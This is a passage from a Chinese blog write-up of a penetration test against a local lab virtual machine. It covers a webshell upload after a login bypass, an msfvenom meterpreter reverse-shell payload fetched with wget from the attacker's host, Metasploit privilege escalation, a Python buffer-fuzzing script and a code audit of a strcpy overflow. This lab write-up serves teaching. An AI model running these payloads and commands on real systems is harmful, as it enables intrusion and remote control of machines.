+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMyYTczYTNlOGEwMzMwNWVjY2E3YWFhNDYyNDMxNGFfMlR1cW94dXNXNDZpTEVVeVMxNVFsN1BYT1hUR0FDZWRfVG9rZW46S1licWI3MTBBb2pYN0p4OWo2YWN0bExqbndjXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>这两个文件用处不大</p>
+<h3 id="RCE-（新增加）">RCE （新增加）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.136/admin/profile.php</span><br></pre></td></tr></table></figure>
+
+<p>里面有隐藏参数，可以传文件到<code>http://192.168.5.136/profile``s</code> 这里面</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg4MjAzZTM4MjgxZWMwODBjNWQxNjc3NzU0NWQ0YzdfbWlGcjJaYzBwbTZERFB4RmNCS3BSOVJsNU1EN2RoQU1fVG9rZW46Q2dRZmI0OE03b0VTRXd4SHNadWNDNVdlblJkXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>用万能密码绕过，抓包看看</p>
+<p>可以传文件 后缀也是自己可以改的</p>
+<p>传一个一句话木马的 webshell </p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=M2M5Y2VmYTY5MjM2YWU4Y2ZmNzI5MTMzNDhiNmNiNGZfeEdFSW83cmRVd25ZOWhScVBkamtxd0xJQkwzRHZPZGdfVG9rZW46SXNHWWIwMTNHb1d2eDl4OUNwUGNUdlB3bkU4XzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>发现这个参数就是上传文件的</p>
+<p>我们传一个一句话木马的 webshell 文件</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjg0YmQ3ZWY3ZmIxN2VlNTg1NWVkOTk5YTY0Y2JiOWRfcllId3lVc3RUV3pUekxXb3E2WlF4ZXhkN3RGamhrQm9fVG9rZW46Rm13OWJJMlpnb0xxU3Z4amNHS2NVQlB4bmNlXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>用蚁剑去连接</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NDAwY2FkYjgwMzA2N2E3YWFiNzU4NzYwMzljMTcyMTlfZmVBNE9PdEJ3UDhkMTBYME1BcXVoUGU0ZjZ5dWhlb2JfVG9rZW46WWFXSWJmNFdHbzVlbmh4Qzl1RWNOUTdSblhjXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>查看内核版本，内核渗透</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTYzYTZmZGQ5NGFmNDk0ZTllMDBmYmE4Mjk1MTVkYmJfU0hDWVlVSnVHbHpaRzNCSEFTT2hQV1F6cmNJVUdKTFVfVG9rZW46SzRyeGJ2dHQ1b2EwalR4TERObmNmU0hnbkhiXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>使用<code>msfconsole</code> 模块的 <code>linux/x86/meterpreter/reverse_tcp</code> 获取一个脚本文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="variable constant_">LHOST</span>=<span class="number">192.168</span><span class="number">.202</span><span class="number">.128</span> <span class="variable constant_">LPORT</span>=<span class="number">4444</span> -f elf -o exp.<span class="property">elf</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=OTAyNGNjM2M5MmQzYjBiODJlMzE5NmUwMmMxYmI5ODNfNWhzU3VsOEZCRUVxRGxadHdNOWxZS1VGVThKRmJGbmxfVG9rZW46WDlOTmJIdlZab29hNVh4R29rNGNKMGFYblZlXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>开启 HTTP 协议，把木马文件传到目标靶机</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4OTMzNTgwMzVjY2I2Mzg0NzU1MTNlNWQwOWIzMGFfQUtIWHB2UmZkcTZNbUJsWlU0RjJ4a0JlazZrZjZoRHFfVG9rZW46SGVjRGI5N3Zzb2t3WHV4cE9QOWNHZ04xbmtlXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>在靶机终端用<code> wget ``http://192.168.5.130:7894/exp.elf</code> 获取</p>
+<p>再用 <code>chmod + x exp.elf</code> 赋予更高的权限，确保能正常的执行</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjgwYmYwMDc1YWRmYTJmMzMyODEzZDJiYjI3YzhkODNfY29nS3JjZnl6bmpuMGM3d2ptSVh4OHhZaXFIVlJPUVdfVG9rZW46RDBpcmJLSlZxb1Z3ZVB4T0daUmNiUU1BbmplXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>在 <code>msfconsole</code> 中监听</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NTEwNTk4NmRjYzQ2MjU4ZjdhNDYyMzQyYTJlMzBkMWJfSk5HTzB1dUVLeU1rTEtyZkI4N2RRUzJSejlvTzY3RVlfVG9rZW46UURjR2JZSld5b3ZjaTR4THVZVmN3VVlRbmxlXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="提权（新增加）">提权（新增加）</h3><p>先保存这个会话<code>ctrl+z</code></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA3N2NmMjY4YzBkODAzN2QzZmU4NjM1NzM1ZTk0MGNfMGRUcmdKZmtGaTNTV3diZ01hUWxrRGJ1NGhQZUVzRlJfVG9rZW46VkVNeWJYeGNpb1piVGJ4QjVCemNlS25jbmVZXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>用 <code>msfconsole</code> 自带的后渗透模块提权 <code>use post/multi/recon/local_exploit_suggester</code></p>
+<p>需要的参数是会话</p>
+<p>我们查看会话是否还在</p>
+<p>然后设置参数运行</p>
+<p>运行结果中第三个百分百成功</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MzgxZGEyMWJhZjEyMmZhYjJkY2Q5ZjMwYjBkZDA0NDlfYndPWXBiUGZLVGtmaUhGTGRNR1A3eDNaOWxBWWhVdk1fVG9rZW46RW5LY2JUUGhKb2NPcmZ4bUFpdWNWa1FIblVlXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGY5Y2FhNmU0MjcwNmM5YWVjYWU5M2Q3MzQ1ZTI1ZjJfaHJRRWRLR3RGWkFxZVZiYmNBenhIMjVySE9seEMyTVJfVG9rZW46TDJQbmJ2Z01Hb0RWSXB4T3hMQWNrTHQ2bkxoXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>use 它然后执行</p>
+<p>设置参数，注意 端口一定要换，因为我们的4444 端口已经被占用了</p>
+<p>提权成功</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDk2NjUzMzlmNWFjM2YxNWZlMTE3ZTZkYzcxMmI3NTJfcmNYMW11em9obng1VzNMVkpvY1NLRU9DV0YzRWVVTXdfVG9rZW46THlOMmJ1dHF6bzJkNEp4aUw0cGM5eElnbkdlXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=M2RjZjc0M2YxMjQyMGI1YzkyOTc2ZjU1NGJjMTIzMTBfclF6ZVY3U09HWURkYWNUTlduNEdkSHRzNTBBdXFHd1NfVG9rZW46Tkk3VGJFWXNrb1FaaXB4bDkyYWNCVUVsbm9mXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-7-7777可疑端口，可能存在-缓冲区溢出">2.7 7777可疑端口，可能存在 缓冲区溢出</h3><p>尝试 <strong>协议模糊测试</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.5.136 7777</span><br></pre></td></tr></table></figure>
+
+<p>发现可以输入东西并且会有回显</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MTY3NTFmZGRjM2MwMzk3OTQ5M2E2Y2ZlNDQ5YzJiNzJfbzJqQUhXRGFEY0pWRkVFUVVKdHp5NE55V0hOZ0RFNDNfVG9rZW46UjJGVWJKSjZjb1BJV3Z4NnRKTGNGRk84bnVjXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h4 id="先怀疑可能可以执行代码">先怀疑可能可以执行代码</h4><p>输入 <code>cmd = ls</code></p>
+<p>发现只是单纯读取了输入</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmMzYzc5YjA2OThiYWJlODk4OGNlZTAwNjhiNGMwNzlfUjlMTGNyTFo4NGFOZXRHZ3ZybzZ1RlpVazJwbVhNUGtfVG9rZW46RFgwRWI1QTBDb0lveWx4RU81OGNYSUp4bnQyXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h4 id="再尝试缓冲区溢出">再尝试缓冲区溢出</h4><p>一直传很多数据</p>
+<p>一直到 100000 个A 的时候出现报错</p>
+<p>但是只是客户让客户端崩溃，属于 DDOS 攻击</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=Mzg3MTRhOWNlOGQyYWNkYzFhMzc4MGMwZTZhM2Q1MTRfeWd0akhJMlFvbGlINnZUU2JBUlJZRG5VNHNxYXJMYUdfVG9rZW46QnREZGJ5aG8zb3JBYUJ4UExyQmM2ZTRzbm5oXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>写一个脚本递增的去输入数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,time,sys</span><br><span class="line">mystr = <span class="string">&quot;A&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        client.connect((<span class="string">&quot;192.168.5.136&quot;</span>, <span class="number">7777</span>))</span><br><span class="line">        msg = (mystr*<span class="number">100</span>*i).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        client.send(msg)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+<span class="built_in">str</span>(i*<span class="number">100</span>)+<span class="string">&quot;个字节已发送&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        client.close()</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;连接终止&quot;</span>)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>结果它把数据分段传输了</p>
+<p>做了限制</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MjQ2ZWJjNzg4ZDljYzM5MGVkYWFmOGI4NTY2YTM3YzRfUm9KZTh4WTNSSVplOHdCNmNHWHEzemNBcWRoM3hBMXJfVG9rZW46VkZFUWJEYmRZb0RUTkt4UVFEc2NyeW43blpmXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-8-敏感文件泄露">2.8 敏感文件泄露</h3><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=N2UwNDBiYmVhZTBiYTczZmJmOGQ0YjgyOTQ0MzliMmVfbG5ualJMRlNOS0RIblJJUXFGYVRIMlVPbHJpMlFvS2lfVG9rZW46SnpGSGI1a0Qzb0JFY0t4OE01WWNBcEZSbnQzXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>扫描的目录有一个<code>http://192.168.5.136/repo/`` </code> 里面有一个</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.5.136/repo/buffd.c"> buffd.c</a></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=OGJiMjA4ZGM3Y2Y4MmM1MDYzNjlhMjNmODRlZTQwN2FfakE5dUh5MmpLY2c4ZlRsbGM2TFlTdnlncmVaWVZxUmNfVG9rZW46RmdLWWJsTkVib1pobFp4c05LNmNueVdGblJ1XzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-9-代码审计">2.9 代码审计</h3><p>对这个.c 文件源码做审计</p>
+<h4 id="缓冲区溢出漏洞（高危）">缓冲区溢出漏洞（高危）</h4><h5 id="1-vulnerable-函数中的栈缓冲区溢出">1. <code>vulnerable</code> 函数中的栈缓冲区溢出</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void vulnerable(char *net_buffer)&#123;char local_buffer[120];strcpy(local_buffer, net_buffer); // 核心漏洞点return;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>问题根源</strong>：<code>strcpy</code> 是不安全的字符串拷贝函数，不会检查目标缓冲区（<code>local_buffer</code>，长度 120 字节）和源缓冲区（<code>net_buffer</code>，长度 2048 字节）的长度。当 <code>net_buffer</code> 中接收的网络数据超过 120 字节时，会覆盖 <code>local_buffer</code> 所在的栈空间（包括栈帧、返回地址等）。</li>
+<li><strong>危害</strong>：攻击者可构造超长输入覆盖栈上的返回地址，执行任意代码（如获取服务器权限、植入恶意程序）。</li>
+</ul>
+<ol>
+<li><h5 id="其他字符串操作的溢出风险">其他字符串操作的溢出风险</h5></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcpy(out_buffer, &quot;RECV: &quot;);strcat(out_buffer, net_buffer);</span><br></pre></td></tr></table></figure>
+
+<p><code>out_buffer</code> 仅 20 字节，<code>strcpy + strcat</code> 组合未检查总长度：若 <code>net_buffer</code> 内容过长，会导致 <code>out_buffer</code> 溢出，破坏相邻内存。</p>
+<h4 id="二、内存操作不规范">二、内存操作不规范</h4><ol>
+<li><h5 id="内存初始化长度错误">内存初始化长度错误</h5></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset(net_buffer, 0, 1024);</span><br></pre></td></tr></table></figure>
+
+<p><code>net_buffer</code> 定义为 <code>char net_buffer[2048];</code>，但 <code>memset</code> 仅初始化前 1024 字节，剩余 1024 字节未初始化，可能包含随机内存数据，存在信息泄露风险。</p>
+<h5 id="2-recv-返回值未校验">2. <code>recv</code> 返回值未校验</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (recv(new_fd, net_buffer, 1024, 0))</span><br></pre></td></tr></table></figure>
+
+<p><code>recv</code> 的返回值规则：</p>
+<ul>
+<li>成功：返回接收的字节数；</li>
+<li>失败：返回 <code>-1</code>；</li>
+<li>连接关闭：返回 <code>0</code>。当前代码仅判断 “非 0”，若 <code>recv</code> 返回 <code>-1</code>（接收失败），仍会执行 <code>vulnerable(net_buffer)</code>，可能使用无效的 <code>net_buffer</code> 数据触发异常</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tubby Little Hero</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/22/1.22%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/">http://example.com/2026/01/22/1.22%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Tubby Little Hero</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E6%B8%97%E9%80%8F/">web渗透</a><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98/">实战</a></div><div class="post-share"><div class="social-share" data-image="/img/leisai.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/11/pWnOS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="pWnOS渗透测试"><img class="cover" src="/img/lingboli.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-11</div><div class="info-item-2">pWnOS渗透测试</div></div><div class="info-2"><div class="info-item-1">pWnOS渗透测试 一、测试概述1.1 测试目标针对 pWnOS 靶机（IP：192.168.5.132）开展全维度黑盒渗透测试，覆盖 Web 应用层、系统服务层、权限提权等维度，挖掘高危漏洞并验证完整攻击链，评估靶机整体安全风险及防御短板。 1.2 测试范围 Web 应用层：index1.php 核心参数（help&#x2F;connect&#x2F;name）、表单交互逻辑、文件包含 &#x2F; 执行漏洞； 系统服务层：SSH（22）、HTTP（80）、Samba（139&#x2F;445）、Webmin（10000）等开放服务的漏洞利用与权限突破； 权限提权层：普通用户（vmware）到 root 权限的提权路径验证； 敏感信息层：系统配置文件、用户凭证、服务漏洞利用脚本等。  1.3 测试工具与方法   工具 &#x2F; 方法 用途    arp-scan 内网 IP 存活探测   Nmap 端口扫描、服务版本识别   searchsploit 漏洞利用脚本检索（Webmin&#x2F;Samba）   浏览器（Chrome） 手工验证文件包含、XSS 漏洞   SS...</div></div></div></a><a class="pagination-related" href="/2026/01/14/CTF6/" title="CTF6渗透测试"><img class="cover" src="/img/2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">CTF6渗透测试</div></div><div class="info-2"><div class="info-item-1">ctf6 靶机渗透测试 渗透测试报告（完整版）测试目标：192.168.5.134（Widgets Inc. 网站）测试时间：2026 年 01 月 18 日测试人员：渗透测试工程师 一、信息收集 主机发现与端口扫描   主机发现：使用 arp-scan 发现目标主机：     1arp-scan -l   结果：192.168.5.134（MAC: 00:0c:29:62:79:f3，VMware 虚拟机）。 端口****扫描：使用 nmap 进行全端口扫描：   1nmap -sV -sC -p- 192.168.5.134   开放端口及服务：     端口 服务 版本    22&#x2F;tcp SSH OpenSSH 4.3   80&#x2F;tcp HTTP Apache httpd 2.2.3 (CentOS)   110&#x2F;tcp POP3 Dovecot pop3d   111&#x2F;tcp RPCbind 2 (RPC #100000)   143&#x2F;tcp IMAP Dovecot imapd   3306&#x2F;tcp MySQ...</div></div></div></a><a class="pagination-related" href="/2026/02/21/xss%E4%B8%80%E4%BA%9B%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" title="xss一些实战漏洞"><img class="cover" src="/img/lingboli.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">xss一些实战漏洞</div></div><div class="info-2"><div class="info-item-1">DOM XSS in Select进入目标页面进入目标页面发现只有一个可供用户操作的输入框 怀疑是唯一可能存在的漏洞注入点  测试测试是否是可利用的漏洞点 通过切换不同的地区，发现url中有回显  构造payload在url里添加payload 1&lt;script&gt;alert(document.cookie)&lt;/script&gt;   使用 alert() 语句在页面弹出所需要的 flag。 漏洞原因未对用户的输入做过滤 修复建议对用户输入进行HTML 转义后再插入 DOM（如使用textContent代替innerHTML）； 限制输入的字符类型（如禁止&lt;、&gt;、script等危险字符 &#x2F; 关键词）； 使用 CSP（内容安全策略）限制页面可执行的脚本来源。 Reflected DOM XSS进入目标页面进入目标页面之后发现一个搜索框可以让用户使用  漏洞分析首先需要理解 Reflected DOM XSS 的特点： 1.输入（如 URL 参数、搜索框内容）会被前端 JS 直接读取并插入到 DOM 中，但未经过滤 &#x2F; 转义； 2.攻...</div></div></div></a><a class="pagination-related" href="/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Hackademic.PTR1靶机渗透"><img class="cover" src="/img/dao.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">Hackademic.PTR1靶机渗透</div></div><div class="info-2"><div class="info-item-1">Hackademic.RTB1靶机渗透测试 是一个打包好的镜像打开虚拟机选择我已移动虚拟机，不然没有网 信息收集1.1 用 arp scan -l 扫描网段存活的主机找到目标靶机：192.168.5.140  1.2 用 nmap 扫描开放端口的服务和版本1.3 dirb 扫描目录用 dirb http//:192.168.5.140/扫描扫不出来什么东西 要用 dirb http//:192.168.5.140/Hackademic.RTB1 扫描二级目录 http://192.168.5.140/Hackademic_RTB1/wp-admin/ 这个目录应该是有用的  漏洞利用2.1 xmlrpc 目录但是页面提示只能 post请求 1curl -x POST ``http://192.168.5.140/Hackademic_RTB1``/xmlrpc.php   用 msfconsole 做进一步的渗透测试 但是返回的结果显示这个页面没有实际的功能  2.2 sql 注入（get）http://192.168.5.140/Hackademic_RTB1/?cat=1 这...</div></div></div></a><a class="pagination-related" href="/2026/02/21/CTF5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="CTF5靶机渗透测试"><img class="cover" src="/img/weierlite.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">CTF5靶机渗透测试</div></div><div class="info-2"><div class="info-item-1">ctf5 靶机渗透测试 测试时间：2026-01-18测试环境：局域网靶机（192.168.5.133）测试目标：从信息收集到提权至 root 权限的完整渗透闭环 一、信息收集1.1 主机发现通过arp-scan -l扫描局域网，定位目标主机： 1arp-scan -l  结果：192.168.5.133（MAC 地址：00:0c:29:44:6b:32，归属 VMware）  1.2 服务扫描使用 Nikto 对 80 端口进行 Web 服务扫描： 1nikto -host 192.168.5.133 -port 80   核心发现（补充新增信息）：  Web 服务：Apache/2.2.6 (Fedora)（已 EOL，存在大量未修复漏洞） 后端语言：PHP/5.2.4（极度老旧，无安全防护） 敏感路径：/phpmyadmin（数据库面板）、/info.php（phpinfo 信息泄露）、/mail（SquirrelMail）、/data（NanoCMS 后台目录） 漏洞点：HTTP TRACE 开启、文件包含漏洞（LFI&#x2F;RFI）、#wp-config.php#凭...</div></div></div></a><a class="pagination-related" href="/2026/02/21/CTF4%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="CTF4靶机渗透"><img class="cover" src="/img/shuai.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-21</div><div class="info-item-2">CTF4靶机渗透</div></div><div class="info-2"><div class="info-item-1">1.15 渗透测试 CTF4 靶机渗透测试报告一、漏洞的发现与验证1.1 信息收集1.1.1寻找目标靶机在虚拟机中打开目标靶机，使用 NAT 模式连接网络，在自己的 kali 上面使用 arp-scan -l扫描存活的主机找到靶机的ip地址，排除掉结尾为 .1，.2，.254的ip 找到目标靶机的ip地址为 192.168.5.131  1.1.2扫描靶机开放端口，功能，版本使用 nmap -sS -sV -O -p- 192.168.5.131 扫描目标靶机的开放端口版本号等 可以发现有一个 80 端口是 HTTP 协议的端口，应该是个网站可以利用  1.1.3目录扫描使用 dirb ``http://192.168.5.131:80``  来扫描目录 得到了一些可能有价值的文件目录 【最高危】****/admin/ 管理后台****目录    路径 状态码 风险点 利用方向    &#x2F;admin&#x2F;admin.php 200 管理后台核心文件，极可能存在登录 &#x2F; 权限漏洞 1. 直接访问测试弱口令（admin&#x2F;admin、admin&#x2...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Tubby Little Hero</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/tubby-little-hero" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:tubbytubbyhero@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%AF%E4%B8%80%E4%B8%AA%E6%89%93%E5%8C%85%E5%A5%BD%E7%9A%84%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">是一个打包好的镜像文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-arp-scan-l%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E7%9A%84-IP-%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">1.1 arp scan -l寻找目标靶机的 IP 地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E4%BD%BF%E7%94%A8-Nmap-%E6%89%AB%E6%8F%8F%E5%87%BA%E5%BC%80%E6%94%BE%E6%9C%8D%E5%8A%A1%E5%8F%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">1.2 使用 Nmap 扫描出开放服务及操作系统版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%9C%89"><span class="toc-number">2.3.</span> <span class="toc-text">1.3 开放的端口有</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text">1.4 扫描目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">3.1.</span> <span class="toc-text">2.1 ssh弱口令爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-80%E7%AB%AF%E5%8F%A3-http-192-168-5-136-admin-post-php-%E7%9A%84-sql-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">2.2 80端口 http:&#x2F;&#x2F;192.168.5.136&#x2F;admin&#x2F;post.php 的 sql 